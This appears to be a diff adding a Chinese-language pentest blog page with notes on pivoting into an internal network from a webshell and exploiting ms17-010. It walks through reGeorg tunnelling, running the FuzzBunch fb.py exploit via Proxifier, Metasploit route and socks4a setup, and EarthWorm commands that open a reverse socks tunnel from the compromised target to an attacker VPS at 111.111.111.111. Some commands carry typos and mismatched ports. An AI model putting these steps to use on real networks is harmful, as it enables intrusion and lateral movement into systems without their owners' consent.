@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <title>内网代理和ms17-010</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Follow Your Heart </a></h1>
+                <nav><ul>
+                    <li><a href="/category/pentest.html">Pentest</a></li>
+                    <li><a href="/category/learning.html">Learning</a></li>
+                    <li><a href="/category/python.html">Python</a></li>
+                    <li><a href="/pages/tips.html">Tips</a></li>
+                    <li><a href="/pages/bash.html">Bash</a></li>
+                    <li><a href="/pages/question.html">Question</a></li>
+                    <li><a href="/pages/reverse-shell.html">各种姿势的反弹shell</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/ms17-010.html" rel="bookmark"
+           title="Permalink to 内网代理和ms17-010">内网代理和ms17-010</a></h1>
+    </header>
+<footer class="post-info">
+        <span class="published" title="2017-06-05T00:00:00+02:00">
+                <a href='#'>06/05/2017 </a>
+                <a href="/category/pentest.html">Pentest</a>
+        </span>
+
+
+
+</footer><!-- /.post-info -->
+    <div class="entry-content">
+      
+      <p>存在webshell的情况下:</p>
+<p>先查看systeminfo，如果打这个<code>KB4019264</code>补丁，多半不会成功。然后上传tunnel.ashx</p>
+<p>然后查看下防火墙策略:<code>netsh firewall show config</code></p>
+<p>windows系统会共存两个python，将python2.6版本重命名为python26，另外一个是python不管他。</p>
+<p>cmd打开运行regery。然后proxifier设置目标的ip走127.0.0.1:8888代理。</p>
+<p>其他就是按照正常的<code>python26 fb.py</code>来运行。</p>
+<p><code>./ew -s lcx_tran -l 8888 -f 127.0.0.1 -g 445</code> 这个未成功</p>
+<p>更新:</p>
+<p>如果得到meterpreter，目标网站没有网站，或者reGeorg代理不能正常使用的话，可以使用socks4代理，步骤:</p>
+<div class="highlight"><pre><span></span><span class="err">添加路由表</span><span class="o">:</span> 
+<span class="n">msf</span><span class="o">&gt;</span><span class="n">route</span> <span class="n">add</span> <span class="mf">10.1</span><span class="o">.</span><span class="mf">1.129</span> <span class="mf">255.255</span><span class="o">.</span><span class="mf">255.255</span> <span class="mi">1</span>
+<span class="n">msf</span><span class="o">&gt;</span><span class="n">use</span> <span class="n">auxiliary</span><span class="sr">/server/s</span><span class="n">ocks4a</span> 
+<span class="kd">set</span> <span class="n">srvhost</span> <span class="o">[</span><span class="err">本地</span><span class="n">ip</span><span class="o">]</span>
+<span class="kd">set</span> <span class="n">srvport</span> <span class="err">［代理端口</span><span class="o">]</span>
+
+<span class="n">run</span> <span class="o">-</span><span class="n">y</span>
+</pre></div>
+
+
+<p>然后现在用proxifier可以添加服务器的代理了。</p>
+<p>来源: http://www.freebuf.com/sectool/56432.html</p>
+<h2>ew转发</h2>
+<p><a href="https://xianzhi.aliyun.com/forum/read/735.html">https://xianzhi.aliyun.com/forum/read/735.html</a></p>
+<p>文章里面提到正向代理，如果目标机器右一个外网IP</p>
+<div class="highlight"><pre><span></span><span class="n">ew</span> <span class="o">-</span><span class="n">s</span> <span class="n">ssocksd</span> <span class="o">-</span><span class="n">l</span> <span class="mi">888</span>
+</pre></div>
+
+
+<p>则假设了一个端口为888，socks的代理。实际测试未成功</p>
+<h3>反弹测试可以成功</h3>
+<p>步骤:</p>
+<p>Linux公网IP: 111.111.111.111</p>
+<p>先在公网vps运行:</p>
+<div class="highlight"><pre><span></span><span class="n">ew</span> <span class="o">-</span><span class="n">s</span> <span class="n">rcsosks</span> <span class="o">-</span><span class="n">l</span> <span class="mi">1008</span> <span class="o">-</span><span class="n">e</span> <span class="mi">888</span>
+</pre></div>
+
+
+<p>把1080端口接收的数据转发给888端口</p>
+<p>然后在目标机器上运行:</p>
+<div class="highlight"><pre><span></span><span class="n">ew</span> <span class="o">-</span><span class="n">s</span> <span class="n">rssocks</span> <span class="o">-</span><span class="n">d</span> <span class="mi">111</span><span class="p">.</span><span class="mi">111</span><span class="p">.</span><span class="mi">111</span><span class="p">.</span><span class="mi">111</span> <span class="o">-</span><span class="n">e</span> <span class="mi">888</span>
+</pre></div>
+
+
+<p>在目标机器上面启动一个socks v5服务，反弹到111.111.111.111的888端口</p>
+<p>然后就可以把111.111.111.111:1008作为一个socks5代理服务器，访问目标服务器的内网资源</p>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+        </section><!-- /#extras -->
+
+
+</body>
+</html>
